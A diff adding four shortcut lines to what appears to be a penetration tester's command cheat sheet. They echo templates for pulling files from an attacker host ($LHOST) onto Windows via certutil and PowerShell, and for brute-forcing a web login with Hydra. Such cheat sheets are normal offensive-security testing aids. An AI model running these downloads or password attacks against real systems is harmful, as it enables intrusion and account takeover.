@@ -1,0 +1,4 @@
+certutil   # echo "certutil -urlcache -split -f http://$LHOST/"
+hydra_form # echo "hydra -V -l USER -P $PASSLIST $RHOST http-post-form \"PATH:DATA:CHECK\""
+ps_wr      # echo "powershell -c \"Invoke-WebRequest -OutFile \"FILE\" http://$LHOST:80/FILE\""
+ps_dl      # echo "powershell -c \"(New-Object Net.WebClient).DownloadFile('http://$LHOST:80/FILE','FILE')\""
